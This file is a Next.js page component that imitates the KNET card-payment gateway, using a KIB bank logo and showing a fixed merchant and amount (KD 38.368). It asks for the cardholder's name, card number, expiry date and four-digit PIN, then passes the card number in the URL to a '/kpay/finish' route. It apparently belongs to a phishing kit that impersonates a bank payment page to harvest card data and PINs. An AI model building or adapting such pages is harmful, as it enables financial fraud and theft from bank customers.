"use client";
import { useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import kibLogo from "../../../public/kib.jpg";
import styles from './page.module.css';

export default function KnetPage() {
  const [fullName, setFullName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expMonth, setExpMonth] = useState("");
  const [expYear, setExpYear] = useState("");
  const [pin, setPin] = useState("");
  const router = useRouter();

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!fullName || !cardNumber || !expMonth || !expYear || !pin) {
      alert("يرجى تعبئة جميع الحقول");
      return;
    }
    router.push(`/kpay/finish?name=${cardNumber}`);
  };

  return (
    <div className={styles.knetContainer}>
      <div className={styles.knetBox}>
        <div className={styles.knetHeader}>
          <Image src={kibLogo} alt="KIB Logo" className={styles.knetLogo} />
        </div>

        <div className={styles.knetInfo}>
          <div className={styles.knetInfoRow}>
            <span className={styles.knetInfoLabel}>Merchant:</span>
            <span>Tap Payments EPSP</span>
          </div>
          <div className={styles.knetInfoRow}>
            <span className={styles.knetInfoLabel}>Amount:</span>
            <span>KD 38.368</span>
          </div>
        </div>

        <form onSubmit={handleSubmit} className={styles.knetForm}>
          <div>
            <label className={styles.formLabel}>Full Name:</label>
            <div className={styles.cardInput}>
              <input
                type="text"
                maxLength="16"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                required
                className={styles.formInput}
              />
            </div>
          </div>
          <hr />

          <div>
            <label className={styles.formLabel}>Card Number:</label>
            <div className={styles.cardInput}>
              <input
                type="text"
                maxLength="16"
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value)}
                required
                className={styles.formInput}
              />
            </div>
          </div>
          <hr />

          <div>
            <label className={styles.formLabel}>Expiration Date:</label>
            <div className={styles.expRow}>
              <select
                className={styles.formInput}
                value={expMonth}
                onChange={(e) => setExpMonth(e.target.value)}
                required
              >
                <option value="">MM</option>
                {[...Array(12)].map((_, i) => {
                  const m = String(i + 1).padStart(2, '0');
                  return <option key={m}>{m}</option>;
                })}
              </select>
              <select
                className={styles.formInput}
                value={expYear}
                onChange={(e) => setExpYear(e.target.value)}
                required
              >
                <option value="">YYYY</option>
                {[2025, 2026, 2027, 2028].map((year) => (
                  <option key={year}>{year}</option>
                ))}
              </select>
            </div>
          </div>
          <hr />

          <div>
            <label className={styles.formLabel}>PIN:</label>
            <input
              type="password"
              maxLength="4"
              value={pin}
              onChange={(e) => setPin(e.target.value)}
              required
              className={styles.formInput}
            />
          </div>
          <hr />

          <div className={styles.buttonRow}>
            <button type="button" className={styles.cancel} onClick={() => router.back()}>
              Cancel
            </button>
            <button type="submit" className={styles.submit}>
              Submit
            </button>
          </div>
        </form>

        <div className={styles.knetFooter}>
          <p>All Rights Reserved. Copyright 2025 ©</p>
          <a href="#">The Shared Electronic Banking Services Company - KNET</a>
        </div>
      </div>
    </div>
  );
          }
